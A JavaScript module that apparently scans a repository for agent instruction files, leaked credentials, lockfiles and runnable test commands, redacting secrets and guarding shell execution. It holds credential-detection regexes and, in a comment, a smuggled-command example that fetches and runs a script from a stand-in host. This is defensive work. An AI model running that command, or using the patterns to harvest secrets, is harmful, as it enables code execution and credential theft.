/**
 * repo.mjs — observe what is in the repository itself.
 *
 * Records what exists, how substantive it is, and whether the commands it advertises
 * actually work. It does not score: "an AGENTS.md of 40 lines with 6 unfilled
 * placeholders" is an observation; whether that is worth points is the scorer's problem.
 */
import { execFileSync, spawn } from 'node:child_process';
import { existsSync, readFileSync, readdirSync, realpathSync, statSync } from 'node:fs';
import { join, relative, extname, sep, resolve } from 'node:path';
import { platform } from 'node:os';
import { excerptCollector, source } from './shared.mjs';

const HARNESS_FILES = [
  'AGENTS.md',
  'CLAUDE.md',
  '.github/copilot-instructions.md',
  '.cursorrules',
  '.cursor/rules',
  'GEMINI.md',
  '.aider.conf.yml',
];

const CONTEXT_DOCS = [
  'docs/project-context.md',
  'docs/business-context.md',
  'docs/architecture.md',
  'docs/ai-infrastructure.md',
];

/** Unfilled scaffolding: {{PLACEHOLDER}}, <!-- FILL ... -->, <!-- REPLACE ... -->. */
const PLACEHOLDER = /\{\{[A-Z_][A-Z0-9_ ,.]*\}\}|<!--\s*(?:FILL|REPLACE|TODO)\b/gi;

/**
 * Secret patterns. Every match is reported by file and line with the value masked —
 * the point is to tell a team they leaked something, never to reproduce it.
 */
const SECRET_PATTERNS = [
  { name: 'aws-access-key-id', re: /\bAKIA[0-9A-Z]{16}\b/, alwaysReal: true },
  { name: 'private-key-block', re: /-----BEGIN (?:RSA |EC |OPENSSH |PGP )?PRIVATE KEY-----/, alwaysReal: true },
  { name: 'github-token', re: /\bgh[pousr]_[A-Za-z0-9]{36,}\b/, alwaysReal: true },
  { name: 'slack-token', re: /\bxox[abprs]-[A-Za-z0-9-]{10,}\b/, alwaysReal: true },
  { name: 'google-api-key', re: /\bAIza[0-9A-Za-z_-]{35}\b/, alwaysReal: true },
  { name: 'openai-key', re: /\bsk-[A-Za-z0-9]{20,}\b/, alwaysReal: true },
  { name: 'jwt', re: /\beyJ[A-Za-z0-9_-]{10,}\.eyJ[A-Za-z0-9_-]{10,}\./, alwaysReal: true },
  // These two match shapes, not issuers, so where they appear decides what they mean.
  { name: 'connection-string-password', re: /\b[a-z+]{2,12}:\/\/[^\s:@/]+:[^\s:@/]{4,}@/i },
  {
    name: 'assigned-credential',
    re: /\b(?:api[_-]?key|secret|password|passwd|token|client[_-]?secret)\b\s*[:=]\s*['"][^'"\s]{12,}['"]/i,
  },
];

/**
 * Hosts that only exist on the developer's own machine.
 *
 * Anchored, and tested against the text *immediately following* the matched credential —
 * `connection-string-password` ends at the `@`, so the host it points at starts exactly
 * there. Testing the whole line instead let an unrelated localhost mention elsewhere on
 * the line vouch for a production credential:
 *
 *     PROD_URL = "postgres://admin:<PRODPW>@db.acme.io/x"  # local: postgres://d:dddd@localhost/x
 *
 * which downgraded a real secret out of scoring entirely.
 */
const LOCAL_HOST_FOLLOWS =
  /^(?:localhost|127\.0\.0\.1|0\.0\.0\.0|\[::1\]|host\.docker\.internal)(?::\d+)?(?:[/\s'"]|$)/i;

/**
 * Files whose whole purpose is to run something locally, or to show the shape of a value.
 *
 * `dev` is deliberately **not** in this list. `infra/main-dev.tf` is an infrastructure
 * file for a development *account*, and the client secret in it is a real credential that
 * a real attacker can use. The placeholder case that made `dev` look safe is already
 * covered by INTERPOLATED.
 */
const LOCAL_ONLY_FILE =
  /(?:^|[\\/])(?:tests?|fixtures?|__tests__|examples?|seeds?)[\\/]|(?:[_.-](?:local|sample|example|template)\b)|(?:^|[\\/])(?:seed|docker-compose)[^\\/]*$/i;

/**
 * A "credential" whose value is a placeholder for one.
 *
 * `postgresql://${var.db_username}:${var.db_password}@${aws_db_instance.this.address}/…`
 * in a Terraform output is the *correct* way to write this, and matched a rule looking for
 * a password in a connection string. So do docker-compose files, Kubernetes manifests, CI
 * configs and `.env.example` — anywhere the shape of a credential is written down without
 * the credential. Tested against the matched text rather than the whole line, so a real
 * secret sharing a line with an unrelated `${…}` is still caught.
 */
const INTERPOLATED =
  /\$\{|\{\{|<[A-Z_]{3,}>|%\(|%s\b|\$[A-Z_]{3,}|process\.env|os\.environ|getenv|ENV\[/;

/**
 * Is this match a credential that only ever pointed at the developer's own machine?
 *
 * `postgresql://mica:mica_password@localhost:5432/...` in `run_winback_job_local.py` is not
 * a leak. Eight of those cost one real repo five points and told it to "rotate anything
 * real" — advice that was both wrong and slightly alarming. It is still reported, because
 * a team should know the scanner saw it; it just no longer counts against them.
 *
 * Issuer-specific patterns (`AKIA…`, `sk-…`, a private key block) are never downgraded:
 * those are real credentials wherever they appear, test directory or not.
 *
 * @param {string} rest text following the matched credential — see LOCAL_HOST_FOLLOWS.
 *   `assigned-credential` has no host, so for it this is simply never local by host, and
 *   only the path can downgrade it.
 */
function isLocalOnlyCredential(pattern, rest, relPath) {
  if (pattern.alwaysReal) return false;
  if (LOCAL_HOST_FOLLOWS.test(rest)) return true;
  return LOCAL_ONLY_FILE.test(relPath);
}

/**
 * Are these two paths the same directory?
 *
 * Not a string comparison. `git rev-parse --show-toplevel` returns a canonicalised path, so
 * comparing the strings meant that scoring a repo through a symlink or a Windows junction —
 * or with a path that merely differed in case — failed the identity test and silently
 * disabled tracked-file detection, which then reported every gitignored credential as
 * committed. That is the false-accusation direction, which is the one that matters here.
 *
 * It also made the two regression tests below unreliable off Linux: `tmpdir()` on macOS
 * sits under the `/var` → `/private/var` symlink, and CI only runs ubuntu.
 */
function sameDirectory(a, b) {
  const canonical = (p) => {
    let out;
    try { out = realpathSync.native(p); } catch { out = resolve(p); }
    // Windows and macOS both compare paths case-insensitively in practice.
    return process.platform === 'linux' ? out : out.toLowerCase();
  };
  return canonical(a) === canonical(b);
}

/**
 * The set of files git actually tracks, or null when this is not a git repo.
 *
 * The secrets criterion is called "No secrets in **tracked** files" and tells a team that
 * "deleting it from the working tree does not remove it from git history". Both statements
 * are false for a file the team deliberately gitignored — `local.settings.json`,
 * `secrets/prod.json`, an untracked scratch file — and those are exactly the files most
 * likely to hold a real credential. Deducting five points and telling someone to rotate a
 * production key over a file they never committed is the worst output this kit can
 * produce, by its own stated principle.
 *
 * Returns null rather than an empty set when git is unavailable, so the caller can tell
 * "nothing is tracked" apart from "we cannot tell", and fall back to scanning everything
 * rather than silently reporting a clean repo.
 */
function trackedFiles(repo) {
  try {
    // `git ls-files` succeeding is not evidence that it answered about the repo we asked
    // about. Run inside a directory that merely *sits within* someone else's repository —
    // a facilitator keeping `bundles/` under version control, a git-managed home directory — it
    // exits 0 and prints nothing, because the team's files are not in that index. Without
    // this check the empty result read as "nothing is tracked", every committed credential
    // was reclassified as untracked, and a repo with a live AWS key in it scored 5/5 on
    // "No secrets in tracked files" and collected a Clean Hands badge.
    const top = execFileSync('git', ['rev-parse', '--show-toplevel'], {
      cwd: repo, encoding: 'utf8', stdio: ['ignore', 'pipe', 'pipe'],
    }).trim();
    if (!sameDirectory(top, repo)) return null;

    const out = execFileSync('git', ['ls-files', '-z'], {
      cwd: repo, encoding: 'utf8', stdio: ['ignore', 'pipe', 'pipe'],
      maxBuffer: 64 * 1024 * 1024,
    });
    const set = new Set();
    for (const p of out.split('\0')) {
      if (p) set.add(p.split('/').join(sep));
    }
    return set;
  } catch {
    return null; // not a git repo, or git is not installed
  }
}

const SKIP_DIRS = new Set([
  '.git', 'node_modules', 'dist', 'build', 'out', 'coverage', '.next', '.venv', 'venv',
  '__pycache__', 'target', 'vendor', '.vibecheck', '.idea', '.gradle', 'obj',
]);

/** Anything that makes "clone it and run it" true. Order is the order they are reported in. */
const CONTAINER_FILES = [
  '.devcontainer', 'docker-compose.yml', 'docker-compose.yaml', 'compose.yml',
  'compose.yaml', 'Dockerfile', 'Containerfile',
];

/**
 * Files that make two installs on different days resolve to the same versions.
 *
 * `pom.xml` and the Gradle build files are here because in those ecosystems the manifest
 * *is* the pin: a Maven dependency declared without a version does not resolve at all.
 * Reading their absence as "no lockfile" cost a Spring Boot repo three points for doing
 * the normal thing correctly.
 */
const LOCKFILES = [
  'package-lock.json', 'pnpm-lock.yaml', 'yarn.lock', 'bun.lockb', 'poetry.lock',
  'uv.lock', 'Pipfile.lock', 'Cargo.lock', 'go.sum', 'requirements.txt', 'composer.lock',
  'Gemfile.lock', 'pom.xml', 'build.gradle', 'build.gradle.kts', 'gradle.lockfile',
  'packages.lock.json',
];

const TEXT_EXTENSIONS = new Set([
  '.js', '.mjs', '.cjs', '.ts', '.tsx', '.jsx', '.py', '.rb', '.go', '.rs', '.java',
  '.cs', '.php', '.sh', '.ps1', '.yml', '.yaml', '.json', '.toml', '.ini', '.env',
  '.md', '.txt', '.sql', '.tf', '.gradle', '.kt', '.swift', '.vue', '.svelte', '.html',
  // JVM and .NET keep configuration — and so credentials — in these.
  '.xml', '.properties', '.kts', '.csproj', '.fsproj', '.vbproj', '.props', '.targets',
  '.config',
]);

const TEST_PATH = /(?:^|[/\\])(?:tests?|__tests__|spec|e2e)(?:[/\\]|$)|\.(?:test|spec)\.[a-z]+$|(?:^|[/\\])test_[^/\\]+\.py$|_test\.(?:go|py|rb)$/i;

/**
 * JVM and .NET test files, which TEST_PATH above does not reach.
 *
 * Maven and Gradle put tests under `src/test/java`, which the directory rule already
 * matches — but .NET puts them in a project directory named `Booking.Tests`, and both
 * ecosystems name the file after the class under test (`BookingServiceTests.cs`,
 * `BookingTest.java`) with no `.test.` or `_test` marker anywhere in the path. A Spring
 * Boot repo with forty test classes was counted as having none.
 *
 * Deliberately case-*sensitive*, and kept separate from TEST_PATH rather than folded into
 * it, because TEST_PATH carries the `i` flag: `latest.java` ends in "test" + ".java" and
 * would match this pattern case-insensitively.
 */
const TEST_PATH_TYPED = /(?:^|[/\\])[^/\\]*\.Tests?[/\\]|(?:^|[/\\])[A-Z][^/\\]*Tests?\.(?:cs|fs|vb|java|kt)$/;

/**
 * Build and project files are not tests, however they are named. Without this a .NET
 * repo's `Booking.Tests/Booking.Tests.csproj` was counted as a test file, so a project
 * with one real test class reported two.
 */
const NOT_A_TEST_FILE = /\.(?:csproj|fsproj|vbproj|props|targets|sln|slnx|xml|json|ya?ml|toml|cfg|ini|md|txt)$/i;

/** A .NET project file, wherever it sits. The dot is escaped: see NOT_A_TEST_FILE. */
const DOTNET_PROJECT = /\.(?:cs|fs|vb)proj$/i;

const isTestPath = (rel) => !NOT_A_TEST_FILE.test(rel)
  && (TEST_PATH.test(rel) || TEST_PATH_TYPED.test(rel));

/**
 * Source files, for scale rather than for judgement.
 *
 * The scorer asks "is three test files enough?", and the honest answer depends on how
 * much code there is: three is a real suite for a one-file script and a token gesture for
 * a hundred-file application. Extensions only — nothing here reads or counts lines.
 */
const CODE_EXTENSIONS = new Set([
  '.js', '.mjs', '.cjs', '.ts', '.tsx', '.jsx', '.vue', '.svelte', '.py', '.rb', '.go',
  '.rs', '.java', '.kt', '.cs', '.fs', '.vb', '.php', '.swift', '.sql',
]);

function walk(root, onFile, { maxFiles = 20000 } = {}) {
  let seen = 0;
  const stack = [root];
  while (stack.length) {
    const dir = stack.pop();
    let entries;
    try { entries = readdirSync(dir, { withFileTypes: true }); } catch { continue; }
    for (const entry of entries) {
      const full = join(dir, entry.name);
      if (entry.isDirectory()) {
        if (!SKIP_DIRS.has(entry.name)) stack.push(full);
        continue;
      }
      if (!entry.isFile()) continue;
      if (++seen > maxFiles) return { truncated: true, seen };
      onFile(full);
    }
  }
  return { truncated: false, seen };
}

function readIfText(path, maxBytes = 512 * 1024) {
  try {
    if (statSync(path).size > maxBytes) return null;
    return readFileSync(path, 'utf8');
  } catch {
    return null;
  }
}

/**
 * How much of this file is still the shipped template? Compared as sets of normalised
 * non-trivial lines, so reordering and reformatting do not hide an untouched template.
 */
function templateSimilarity(content, templatePath) {
  const template = readIfText(templatePath);
  if (!template) return null;
  const normalise = (text) => new Set(
    text.split('\n').map((l) => l.trim().toLowerCase()).filter((l) => l.length > 15)
  );
  const a = normalise(content);
  const b = normalise(template);
  if (!b.size) return null;
  let shared = 0;
  for (const line of a) if (b.has(line)) shared++;
  return Math.round((shared / b.size) * 100) / 100;
}

function describeHarnessFile(repo, rel, kitRoot, budget) {
  const full = join(repo, rel);
  if (!existsSync(full)) return { path: rel, present: false };
  const content = readIfText(full);
  if (content === null) return { path: rel, present: true, unreadable: true };
  const placeholders = content.match(PLACEHOLDER) ?? [];
  const templateCandidates = [
    join(kitRoot, '02-agentic-preparation', 'templates', rel.split(/[/\\]/).pop()),
    join(kitRoot, '02-agentic-preparation', 'templates', 'instructions', rel.split(/[/\\]/).pop()),
  ];
  let similarity = null;
  for (const candidate of templateCandidates) {
    similarity = templateSimilarity(content, candidate);
    if (similarity !== null) break;
  }
  return {
    path: rel,
    present: true,
    bytes: Buffer.byteLength(content, 'utf8'),
    lines: content.split('\n').length,
    unfilledPlaceholders: placeholders.length,
    templateSimilarity: similarity,
    // Bounded, and **redacted**, so a facilitator's judging pass — which reads only
    // evidence.json, never the repo — has something to judge for "substantive vs.
    // boilerplate" without this becoming a way to republish a leaked credential.
    //
    // Harness files are ordinary tracked source and can contain secrets like any other
    // file: a team documenting "the staging password is X so the agent can run
    // migrations" is exactly the sort of thing that ends up in an AGENTS.md. Every other
    // path in this file masks secrets rather than reproducing them; this one must too,
    // especially since the excerpt is sent to a model by the judging skill.
    contentExcerpt: excerptOf(redactSecrets(content), budget),
  };
}

const HARNESS_EXCERPT_CHARS = 4000;

/** Total excerpt budget across every harness/instruction/context file in one harvest. */
const HARNESS_EXCERPT_TOTAL_CHARS = 60000;

/**
 * Global versions of the detection patterns. The originals are non-global because they
 * only ever answer "does this line match"; replacing every occurrence needs the `g` flag.
 */
const SECRET_PATTERNS_GLOBAL = SECRET_PATTERNS.map(({ name, re }) => ({
  name,
  re: new RegExp(re.source, re.flags.includes('g') ? re.flags : re.flags + 'g'),
}));

/** Replace anything that looks like a credential with a named marker. */
function redactSecrets(text) {
  let out = text;
  for (const { name, re } of SECRET_PATTERNS_GLOBAL) {
    re.lastIndex = 0;
    out = out.replace(re, '[redacted: ' + name + ']');
  }
  return out;
}

/**
 * Truncate to the per-file cap, and stop emitting excerpts once the whole-harvest budget
 * is spent — a repo with dozens of instruction files should not grow evidence.json
 * without bound.
 */
function excerptOf(content, budget) {
  if (budget && budget.remaining <= 0) return '… (excerpt budget spent)';
  const capped = content.length <= HARNESS_EXCERPT_CHARS
    ? content
    : content.slice(0, HARNESS_EXCERPT_CHARS) + '\n… (truncated)';
  if (budget) budget.remaining -= capped.length;
  return capped;
}

/**
 * How a script or target name maps to a kind of command.
 *
 * Matched against the *start* of the name rather than the whole of it. The exact-key
 * lookup this replaced recognised only a script literally called `test`, so a repo whose
 * scripts were `test:e2e` and `test:e2e:quick`, whose Makefile had `test-lambdas:`,
 * `verify:` and `verify-be:`, and whose pytest config lived one directory down, was
 * reported as having no runnable test command at all. That single miss cost 16 points
 * across three criteria and produced the line "an agent that cannot run your tests cannot
 * check its own work" on a repo with 84 test files.
 */
const COMMAND_KINDS = [
  ['setup', /^(?:setup|install|bootstrap|init|deps|dependencies)(?![a-z])/i],
  ['test', /^(?:tests?|testing|spec|specs|unit|pytest|jest|vitest|verify|check|ci)(?![a-z])/i],
  ['dev', /^(?:dev|develop|serve|watch)(?![a-z])/i],
  ['start', /^(?:start|run|up)(?![a-z])/i],
  ['lint', /^(?:lint|format|fmt|style|prettier|eslint|ruff|clippy)(?![a-z])/i],
  ['build', /^(?:build|compile|bundle|dist|package)(?![a-z])/i],
  ['typecheck', /^(?:typecheck|tsc|types|mypy)(?![a-z])/i],
];

/**
 * Suites that need something this scorer has not started — a dev server, a browser, a
 * seeded database. Running one all but guarantees a red result for reasons that have
 * nothing to do with the team's code, so it is a last resort even when it is the only
 * thing named `test`.
 */
const NEEDS_A_RUNNING_WORLD =
  /(?:e2e|end[-_]?to[-_]?end|integration|browser|playwright|cypress|selenium|smoke|acceptance)/i;

/** Targets that bundle lint and build in with the tests, and so fail for unrelated reasons. */
const AGGREGATE = /^(?:verify|check|ci|all|validate)(?![a-z])/i;

function kindOf(name) {
  for (const [kind, re] of COMMAND_KINDS) if (re.test(name)) return kind;
  return null;
}

/**
 * Command fragments are now taken from repo content — script keys, Makefile targets,
 * directory names — and the detected test command is executed through a shell. That makes
 * a directory called `x; curl evil.sh | sh` or a target with backticks in it a command
 * injection against whoever runs the scorer, which is a facilitator with the repo already on
 * their machine.
 *
 * So nothing reaches a command line unless it is boring: letters, digits, and the handful
 * of separators real script names use. A name that fails this is dropped rather than
 * quoted — quoting is a second thing to get right, and no legitimate npm script or make
 * target needs anything outside this set.
 */
const SAFE_NAME = /^[A-Za-z0-9][A-Za-z0-9_.:-]*$/;
const SAFE_DIR = /^[A-Za-z0-9][A-Za-z0-9_.-]*(?:\/[A-Za-z0-9][A-Za-z0-9_.-]*)*$/;

function isShellSafe(name, dir) {
  if (!SAFE_NAME.test(name)) return false;
  return dir === '' || SAFE_DIR.test(dir);
}

/** Directories worth looking in for a manifest. Root first, then two levels down. */
function manifestDirs(repo, maxDirs = 40) {
  const dirs = [''];
  const queue = [{ dir: repo, rel: '', depth: 0 }];
  while (queue.length && dirs.length < maxDirs) {
    const { dir, rel, depth } = queue.shift();
    if (depth >= 2) continue;
    let entries;
    try { entries = readdirSync(dir, { withFileTypes: true }); } catch { continue; }
    for (const entry of entries) {
      if (!entry.isDirectory() || SKIP_DIRS.has(entry.name)) continue;
      // A dot-directory holds tooling config, not a project to build.
      if (entry.name.startsWith('.')) continue;
      const childRel = rel ? rel + '/' + entry.name : entry.name;
      dirs.push(childRel);
      queue.push({ dir: join(dir, entry.name), rel: childRel, depth: depth + 1 });
      if (dirs.length >= maxDirs) break;
    }
  }
  return dirs;
}

/** Every command found, each recorded with where it came from so a report can cite it. */
function collectCandidates(repo) {
  const out = [];
  const add = (kind, command, sourceFile, name, dir) => {
    if (!kind) return;
    // Dropped, not quoted — see isShellSafe. A repo whose script names are exotic enough
    // to fail this loses a detected command, which is a far smaller problem than running
    // its directory name as a shell command.
    if (!isShellSafe(name, dir)) return;
    out.push({ kind, command, source: sourceFile, name, dir, depth: dir ? dir.split('/').length : 0 });
  };

  for (const dir of manifestDirs(repo)) {
    const abs = dir ? join(repo, dir) : repo;
    const at = (f) => (dir ? dir + '/' + f : f);

    const pkgPath = join(abs, 'package.json');
    if (existsSync(pkgPath)) {
      try {
        const scripts = JSON.parse(readFileSync(pkgPath, 'utf8')).scripts ?? {};
        for (const name of Object.keys(scripts)) {
          // `npm --prefix` keeps every command runnable from the repository root, which
          // matters because that is the only directory the runner knows about.
          const prefix = dir ? 'npm --prefix ' + dir + ' ' : 'npm ';
          const command = name === 'test' ? prefix + 'test' : prefix + 'run ' + name;
          add(kindOf(name), command, at('package.json'), name, dir);
        }
      } catch { /* malformed package.json — reported as no scripts */ }
    }

    if (['pyproject.toml', 'pytest.ini', 'tox.ini', 'setup.cfg'].some((f) => existsSync(join(abs, f)))) {
      add('test', dir ? 'pytest ' + dir : 'pytest', at('pyproject.toml'), 'pytest', dir);
    }
    if (existsSync(join(abs, 'requirements.txt'))) {
      add('setup', dir ? 'pip install -r ' + dir + '/requirements.txt' : 'pip install -r requirements.txt',
        at('requirements.txt'), 'pip-install', dir);
    }
    if (existsSync(join(abs, 'go.mod'))) {
      add('test', dir ? 'go test ./' + dir + '/...' : 'go test ./...', at('go.mod'), 'go-test', dir);
    }
    if (existsSync(join(abs, 'Cargo.toml'))) {
      add('test', dir ? 'cargo test --manifest-path ' + dir + '/Cargo.toml' : 'cargo test',
        at('Cargo.toml'), 'cargo-test', dir);
    }

    // Maven. `-q` keeps the run readable; the summary line the outcome classifier reads
    // ("Tests run: N, Failures: N") is printed regardless.
    if (existsSync(join(abs, 'pom.xml'))) {
      add('test', dir ? 'mvn -q -f ' + dir + '/pom.xml test' : 'mvn -q test',
        at('pom.xml'), 'mvn-test', dir);
      add('build', dir ? 'mvn -q -f ' + dir + '/pom.xml package -DskipTests'
        : 'mvn -q package -DskipTests', at('pom.xml'), 'mvn-package', dir);
    }

    // Gradle. The wrapper is preferred over a system `gradle` for the same reason a
    // lockfile is: it pins the version the team actually built with.
    for (const manifest of ['build.gradle', 'build.gradle.kts']) {
      if (!existsSync(join(abs, manifest))) continue;
      const wrapper = ['gradlew', 'gradlew.bat'].some((w) => existsSync(join(repo, w)));
      // The backslash is doubled because this is a JS string, not a path literal:
      // '.\gradlew.bat' is JavaScript for the string `.gradlew.bat` — \g is not an
      // escape sequence, so the backslash simply vanishes — and that is not a path.
      // A Windows team with a wrapper right there had no runnable test command.
      const runner = wrapper
        ? (platform() === 'win32' ? '.\\gradlew.bat' : './gradlew')
        : 'gradle';
      const where = dir ? ' -p ' + dir : '';
      add('test', runner + where + ' test', at(manifest), 'gradle-test', dir);
      add('build', runner + where + ' build -x test', at(manifest), 'gradle-build', dir);
      break;
    }

    // .NET. A solution is the entry point when there is one; otherwise the project file.
    // Only the directory is passed to the command, never the file name, because a project
    // file may contain spaces and isShellSafe would drop it.
    let dotnetManifest = null;
    try {
      dotnetManifest = readdirSync(abs)
        .find((f) => f.endsWith('.sln') || f.endsWith('.slnx'))
        ?? readdirSync(abs).find((f) => /\.(?:cs|fs|vb)proj$/.test(f))
        ?? null;
    } catch { /* unreadable directory — nothing to detect */ }
    if (dotnetManifest) {
      const where = dir ? ' ' + dir : '';
      add('test', 'dotnet test' + where, at(dotnetManifest), 'dotnet-test', dir);
      add('build', 'dotnet build' + where, at(dotnetManifest), 'dotnet-build', dir);
      add('setup', 'dotnet restore' + where, at(dotnetManifest), 'dotnet-restore', dir);
    }

    for (const [file, runner] of [['Makefile', 'make'], ['justfile', 'just'], ['Justfile', 'just']]) {
      const path = join(abs, file);
      if (!existsSync(path)) continue;
      const text = readIfText(path) ?? '';
      // A target is a name at the start of a line followed by a colon. `.PHONY` and
      // pattern rules are not targets anyone runs by name.
      for (const m of text.matchAll(/^([A-Za-z][\w.-]*)\s*:(?!=)/gm)) {
        const name = m[1];
        if (name.startsWith('.')) continue;
        const command = runner === 'make'
          ? (dir ? 'make -C ' + dir + ' ' + name : 'make ' + name)
          : (dir ? 'just -f ' + dir + '/' + file + ' ' + name : 'just ' + name);
        add(kindOf(name), command, at(file), name, dir);
      }
    }
  }
  return out;
}

/**
 * Which of several test commands to actually execute. Lower is better.
 *
 * The ordering exists because *finding* more commands makes it easier to pick a bad one:
 * an e2e suite needs a dev server this scorer never started, and an aggregate `verify`
 * target runs lint and build too. Either would come back red for reasons that say nothing
 * about the team, which is the same false negative in a new costume.
 */
function testRunPreference(c) {
  // Depth dominates. A root Makefile target is the entry point the team chose to publish;
  // a `test` script inside one package of a monorepo runs a fraction of the suite and only
  // looks better because its name is tidier.
  let rank = c.depth * 8;
  if (NEEDS_A_RUNNING_WORLD.test(c.name)) rank += 100;
  if (AGGREGATE.test(c.name)) rank += 40;
  // Names this file assigns to language-native runners, plus a script literally called
  // `test`: all of them mean "the suite", with nothing bundled in alongside it.
  if (['test', 'pytest', 'go-test', 'cargo-test', 'mvn-test', 'gradle-test', 'dotnet-test']
    .includes(c.name)) rank -= 3;
  if (/^(?:make|just)\b/.test(c.command)) rank += 2;
  return rank;
}

/**
 * @returns {object} the highest-confidence command of each kind, plus every candidate
 *   found and where it came from, so a report can say "found `make verify` in Makefile"
 *   instead of "none detected".
 */
function detectCommands(repo) {
  const candidates = collectCandidates(repo);
  const found = { candidates };

  const rootPkg = join(repo, 'package.json');
  if (existsSync(rootPkg)) {
    try {
      found.packageManagerScripts = Object.keys(JSON.parse(readFileSync(rootPkg, 'utf8')).scripts ?? {});
    } catch { /* malformed package.json — reported as no scripts */ }
  }

  for (const [kind] of COMMAND_KINDS) {
    const ofKind = candidates.filter((c) => c.kind === kind);
    if (!ofKind.length) continue;
    const best = kind === 'test'
      ? ofKind.slice().sort((a, b) => testRunPreference(a) - testRunPreference(b))[0]
      : ofKind.slice().sort((a, b) => a.depth - b.depth)[0];
    found[kind] = best.command;
    found[kind + 'Source'] = best.source;
  }
  return found;
}

/**
 * Does `.gitignore` cover a file called `.env`?
 *
 * The regex this replaced was `/^\s*\.env\b/m`, which missed `/.env` — the root-anchored
 * form, and the more precise way to write it. A repo that had ignored `.env`, `.env.*`
 * and `lambdas/.env` was told its .gitignore did not cover .env files.
 */
function gitignoreCoversEnvFile(gitignore) {
  for (const raw of gitignore.split('\n')) {
    const line = raw.trim();
    // Negations could in principle re-include a .env; treating one as coverage would be
    // worse than ignoring it, so they are skipped rather than counted.
    if (!line || line.startsWith('#') || line.startsWith('!')) continue;
    if (line.endsWith('/')) continue; // a directory pattern, not this file
    const body = line.replace(/^\//, '').replace(/^\*\*\//, '');
    // A pattern with a `/` left inside it is anchored to the .gitignore's own directory,
    // so `lambdas/.env` ignores that file and not a `.env` at the root. Treating the last
    // segment as decisive at any depth was the wrong rule and reported root coverage a
    // repo did not have.
    if (body.includes('/')) continue;
    const base = body;
    if (!base) continue;
    const re = new RegExp('^' + base.split('*')
      .map((part) => part.replace(/[.*+?^${}()|[\]\\]/g, '\\$&'))
      .join('[^/]*') + '$');
    if (re.test('.env')) return true;
  }
  return false;
}

/**
 * Kill a process and everything it spawned.
 *
 * Node's own `timeout` option signals only the process it started. A test command is
 * normally run through a shell, which starts a runner, which starts workers — so a
 * hanging suite leaves those grandchildren running on the team's machine after the
 * harvester exits. Windows needs taskkill for tree termination; elsewhere the child is
 * spawned as a process-group leader so the group can be signalled by negative pid.
 */
function killTree(child) {
  if (child.pid === undefined) return;
  try {
    if (process.platform === 'win32') {
      execFileSync('taskkill', ['/T', '/F', '/PID', String(child.pid)], { stdio: 'ignore' });
    } else {
      process.kill(-child.pid, 'SIGKILL');
    }
  } catch {
    try { child.kill('SIGKILL'); } catch { /* already gone */ }
  }
}

/**
 * Failures that happened *before* any test ran.
 *
 * Detecting more test commands means occasionally picking one this machine cannot run —
 * dependencies were never installed, a database is not up, the runner is not on PATH.
 * Scoring those as "the suite is red at hand-in" would replace one false negative with
 * another, so they are reported as unassessable instead. Matched against the output tail,
 * because exit codes for these are indistinguishable from an ordinary test failure.
 *
 * @returns {string|null} a short reason, or null when the suite genuinely ran.
 */
function whyItCouldNotStart(exitCode, output, summary) {
  if (exitCode === 0) return null;
  // If the runner printed a pass or fail count, it reached the tests — whatever else the
  // output says. Without this gate the patterns below are catastrophically wrong, because
  // `Cannot find module`, `No such file or directory` and `ECONNREFUSED` are among the
  // most ordinary strings in a *failing test's* output: a suite reporting "412 passed, 3
  // failed" was being reported to the team as never having started. That is the same false
  // negative this function exists to prevent, wearing a different hat.
  if (typeof summary?.passed === 'number' || typeof summary?.failed === 'number') return null;
  const checks = [
    [/Cannot find module|MODULE_NOT_FOUND|ERR_MODULE_NOT_FOUND/i, 'a dependency is not installed'],
    [/ModuleNotFoundError|No module named/i, 'a Python package is not installed'],
    [/command not found|is not recognized as an internal or external command|executable file not found/i,
      'the runner is not on PATH'],
    [/npm ERR!\s*Missing script|Unknown command|no such file or directory/i,
      'the command does not exist here'],
    [/No rule to make target/i, 'that make target does not exist'],
    [/ECONNREFUSED|Connection refused|could not connect to server|Is the server running/i,
      'a service it depends on is not running'],
    [/Cannot connect to the Docker daemon/i, 'Docker is not running'],
    [/error: could not find `Cargo\.toml`|cannot find main module/i, 'no project manifest here'],
    [/No tests? (?:were )?(?:found|ran|collected)|no tests to run/i, 'the runner found no tests to run'],
  ];
  for (const [re, why] of checks) if (re.test(output)) return why;
  return null;
}

/**
 * Pass/fail counts, pulled out of whatever the runner printed.
 *
 * `exited 2` is true and useless. "516 passed, 2 failed" is the same fact in a form a team
 * can act on, and it is the difference between "your suite is broken" and "two migration
 * tests need a database". Deliberately runner-agnostic — pytest, jest, vitest and mocha
 * all print some variant of these words, and a runner nobody here has seen simply yields
 * nulls rather than a wrong number.
 *
 * @returns {{passed: number|null, failed: number|null, skipped: number|null}}
 */
function summariseRun(output) {
  const first = (...patterns) => {
    for (const re of patterns) {
      const m = output.match(re);
      if (m) return Number(m[1]);
    }
    return null;
  };
  return {
    passed: first(/(\d+) passed/i, /(\d+) passing/i, /(\d+) tests? ok/i),
    failed: first(/(\d+) failed/i, /(\d+) failing/i, /(\d+) failures?\b/i),
    skipped: first(/(\d+) skipped/i, /(\d+) pending/i),
  };
}

function runTests(repo, command, timeoutMs) {
  const started = Date.now();
  return new Promise((resolve) => {
    const child = spawn(command, {
      cwd: repo, shell: true, detached: process.platform !== 'win32',
      stdio: ['ignore', 'pipe', 'pipe'],
    });

    let output = '';
    let timedOut = false;
    const append = (chunk) => {
      output += chunk;
      // Keep only the tail: a chatty suite must not be able to exhaust memory.
      if (output.length > 64 * 1024) output = output.slice(-32 * 1024);
    };
    child.stdout?.on('data', (c) => append(String(c)));
    child.stderr?.on('data', (c) => append(String(c)));

    const timer = setTimeout(() => { timedOut = true; killTree(child); }, timeoutMs);

    const finish = (exitCode) => {
      clearTimeout(timer);
      const summary = summariseRun(output);
      const blocked = timedOut ? null : whyItCouldNotStart(exitCode, output, summary);
      resolve({
        ran: true,
        timedOut,
        exitCode: timedOut ? null : exitCode,
        durationMs: Date.now() - started,
        // A suite that never got as far as running a test has told us nothing about the
        // team's code, and must not be scored as a red suite. See whyItCouldNotStart.
        couldNotStart: Boolean(blocked),
        couldNotStartWhy: blocked,
        summary,
        // Redacted like every other excerpt. A suite that prints a credential — an
        // integration test echoing its connection string, a failing assertion dumping a
        // config object — would otherwise put it verbatim into evidence.json, which the
        // judging skill loads whole into a model's context. `contentExcerpt` has always
        // been redacted; this was the one path that was not, and broadening command
        // detection is what turned it from rare into likely.
        tail: redactSecrets(output.slice(-4000)),
      });
    };
    child.on('error', (err) => {
      clearTimeout(timer);
      resolve({ ran: false, reason: 'could not start test command: ' + err.message });
    });
    child.on('close', (code) => finish(code));
  });
}

